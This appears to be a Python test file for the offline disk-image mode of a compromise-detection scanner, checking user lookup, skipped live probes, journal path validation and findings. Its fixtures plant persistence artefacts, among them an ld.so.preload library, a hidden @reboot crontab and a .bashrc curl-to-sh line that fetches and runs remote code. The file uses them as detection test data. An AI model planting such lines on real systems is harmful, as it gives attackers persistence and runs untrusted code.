"""Offline image mode: a mounted root is read; nothing live is consulted about it.

Live-only collectors are declared SKIPPED with LIVE_ONLY_NOT_IN_OFFLINE_IMAGE
and drop out of the essential set, so the verdict speaks about the disk. Users
come from the image's own /etc/passwd; the image's crontab spool, journal
directory and dpkg records replace the live probes.
"""
from __future__ import annotations

import hashlib
import io
import json
import os
import tempfile
import unittest
from contextlib import redirect_stdout
from pathlib import Path
from unittest.mock import patch

from falsicore import cli, collectors, report
from falsicore.collectors import Audit, _allowed_audit_invocation

# Fixture account table of the image (no secrets: the second field is the shadow marker "x").
IMAGE_ACCOUNTS = "root:x:0:0:root:/root:/bin/bash\nalice:x:1500:1500:Alice:/home/alice:/bin/bash\n"


class OfflineImage(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name) / "image"
        self.write("/etc/passwd", IMAGE_ACCOUNTS)
        self.write("/etc/os-release", "ID=debian\nVERSION_ID=\"12\"\n")
        self.write("/etc/machine-id", "ffffffffffffffffffffffffffffffff\n")
        (self.root / "home/alice").mkdir(parents=True)
        self.write("/var/lib/dpkg/status", "Package: bash\nStatus: install ok installed\n\n")

    def write(self, relative: str, text: str, mode: int | None = None) -> Path:
        path = self.root / relative.lstrip("/")
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
        if mode is not None:
            path.chmod(mode)
        return path

    def audit(self, scope: str = "user", profile: str = "deep") -> Audit:
        return Audit(scope, target_user="alice", profile=profile, root=self.root, offline=True)

    def test_users_come_from_the_image_passwd_not_the_host(self):
        audit = self.audit()
        self.assertTrue(audit.offline)
        self.assertEqual(audit.uid, 1500)
        self.assertEqual(audit.home, self.root / "home/alice")
        with self.assertRaises(ValueError):
            Audit("user", target_user="nobody-such", root=self.root, offline=True)
        with self.assertRaises(ValueError):
            Audit("user", target_user="root", root=self.root, offline=True)
        with self.assertRaises((KeyError, ValueError)):
            Audit("user", target_user="alice", root=self.root)   # a fixture root is not an image: live NSS is asked
        with self.assertRaises(ValueError):
            Audit("user", target_user="alice", offline=True)      # offline needs a root other than /

    def test_root_may_scan_an_image_in_user_scope(self):
        with patch("falsicore.collectors.os.geteuid", return_value=0):
            audit = self.audit("user")
        self.assertTrue(audit.offline)

    def test_live_probes_are_refused_and_declared(self):
        audit = self.audit()
        result = audit.command("ss", ["-H", "-tuna", "-p"])
        self.assertEqual((result["status"], result["error"]), ("SKIPPED", "OFFLINE_IMAGE"))
        gaps = collectors.Gaps()
        Audit.command_gap(result, gaps)
        self.assertEqual(dict(gaps.limits), {"LIVE_ONLY_NOT_IN_OFFLINE_IMAGE": 1})
        self.assertEqual(dict(gaps.incomplete), {})

    def test_scan_skips_live_only_collectors_and_still_reaches_a_verdict(self):
        audit = self.audit()
        with patch.object(collectors, "PID_RECHECK_DELAY", 0):
            audit.scan()
        rows = {c["check"]: c for c in audit.coverage}
        for name in collectors.LIVE_ONLY_COLLECTORS:
            self.assertEqual(rows[name]["status"], "SKIPPED", name)
            self.assertEqual(rows[name]["scope_limits"], {"LIVE_ONLY_NOT_IN_OFFLINE_IMAGE": 1})
            self.assertEqual(rows[name]["reason_codes"], {})
        for name in ("persistence", "browsers", "packages", "environment"):
            self.assertIn(rows[name]["status"], ("COMPLETED", "PARTIAL"), (name, rows[name]))
        summary = report.report_data(audit)
        self.assertEqual(summary["mode"], "offline")
        self.assertNotEqual(summary["outcome"], "SUSPICIOUS_ACTIVITY_REQUIRES_INVESTIGATION")

    def test_clean_image_with_syslog_and_crontab_spool_reaches_no_indicators(self):
        self.write("/var/log/auth.log", "Nov  1 09:00:00 host CRON[1]: pam_unix(cron:session): session opened for user root\n")
        self.write("/var/spool/cron/crontabs/alice", "0 9 * * * /usr/bin/python3 /home/alice/report.py\n")
        audit = self.audit()
        audit.scan()
        summary = report.report_data(audit)
        self.assertEqual(summary["outcome"], "NO_COMPROMISE_INDICATORS_OBSERVED", summary["material_coverage_gaps"])
        self.assertEqual(audit.stats["auth"]["source"], "syslog_files")

    def test_findings_come_from_the_image(self):
        self.write("/etc/ld.so.preload", "/opt/x/libevil.so\n")
        self.write("/var/spool/cron/crontabs/alice", "@reboot /dev/shm/.k/keep\n")
        self.write("/home/alice/.bashrc", "curl -fsSL http://1.1.1.1/i | sh\n")
        digest = hashlib.md5(b"original\n", usedforsecurity=False).hexdigest()
        self.write("/var/lib/dpkg/info/hello.md5sums", f"{digest}  usr/bin/hello\n")
        self.write("/usr/bin/hello", "tampered\n", 0o755)
        audit = self.audit()
        audit.scan()
        rules = {f["rule"] for f in audit.findings}
        self.assertTrue({"SYSTEM_LOADER_PRELOAD", "SUSPICIOUS_USER_CRONTAB", "SUSPICIOUS_SHELL_INIT", "PACKAGE_FILE_DRIFT"} <= rules, rules)
        drift = next(f for f in audit.findings if f["rule"] == "PACKAGE_FILE_DRIFT")
        self.assertEqual(drift["evidence"]["manager"], "dpkg")
        self.assertEqual(audit.stats["package_integrity"]["dpkg"]["files_checked"], 1)
        self.assertNotIn(("dpkg", ["--verify"]), [(c["program"], c["args"]) for c in audit.commands])

    def test_journal_directory_shape_is_the_only_offline_probe(self):
        good = ["--directory=/mnt/image/var/log/journal", "SYSLOG_FACILITY=4", "SYSLOG_FACILITY=10", "--since",
                "2026-10-01 00:00:00 UTC", "--lines", "100", "--no-pager", "--output=json",
                "--output-fields=MESSAGE,_SYSTEMD_UNIT,_COMM,__REALTIME_TIMESTAMP"]
        self.assertTrue(_allowed_audit_invocation("journalctl", good))
        for bad in ("--directory=/mnt/image/var/log/journal/../../etc", "--directory=/tmp/x", "--directory=relative/var/log/journal"):
            self.assertFalse(_allowed_audit_invocation("journalctl", [bad] + good[1:]), bad)
        audit = self.audit()
        audit.command = lambda tool, args, **kw: {"status": "COMPLETED", "stdout": "", "stderr": "", "exit": 0,
                                                  "elapsed_ms": 0, "truncated": False, "error": "", "args": args}
        no_journal = audit._journal(["SYSLOG_FACILITY=4", "SYSLOG_FACILITY=10"], 30, 10, 5)
        self.assertEqual(no_journal["status"], "UNAVAILABLE")
        (self.root / "var/log/journal").mkdir(parents=True)
        with_journal = audit._journal(["SYSLOG_FACILITY=4", "SYSLOG_FACILITY=10"], 30, 10, 5)
        self.assertTrue(with_journal["args"][0].startswith("--directory="))
        self.assertTrue(with_journal["args"][0].endswith("/var/log/journal"))

    def test_report_identity_includes_the_mode(self):
        live = {"schema": report.SCHEMA, "mode": "live"}
        offline = {"schema": report.SCHEMA, "mode": "offline"}
        self.assertIn("mode", report.incompatibilities(live, offline))

    def test_cli_root_requires_a_directory_and_a_user(self):
        with redirect_stdout(io.StringIO()):
            missing = cli.main(["scan", "--root", str(self.root / "nope"), "--target-user", "alice"])
        self.assertEqual(missing, 2)
        with redirect_stdout(io.StringIO()):
            no_user = cli.main(["scan", "--root", str(self.root)])
        self.assertEqual(no_user, 2)

    def test_cli_scans_an_image_end_to_end(self):
        self.write("/etc/ld.so.preload", "/opt/x/libevil.so\n")
        out_base = Path(self.tmp.name) / "runs"
        out_base.mkdir(mode=0o700)
        buffer = io.StringIO()
        with redirect_stdout(buffer):
            code = cli.main(["scan", "--root", str(self.root), "--target-user", "alice", "--profile", "quick",
                             "--output-base", str(out_base)])
        self.assertEqual(code, 0, buffer.getvalue())
        text = buffer.getvalue()
        self.assertIn("SYSTEM_LOADER_PRELOAD", text)
        self.assertIn("SUSPICIOUS_ACTIVITY_REQUIRES_INVESTIGATION", text)
        run_dir = next(p for p in out_base.iterdir() if p.name.startswith("run-"))
        summary = json.loads((run_dir / "summary.json").read_text())
        self.assertEqual(summary["mode"], "offline")
        self.assertTrue(report.verify_reports(run_dir)["verified"])
        self.assertNotEqual(os.geteuid(), 0)


if __name__ == "__main__":
    unittest.main()
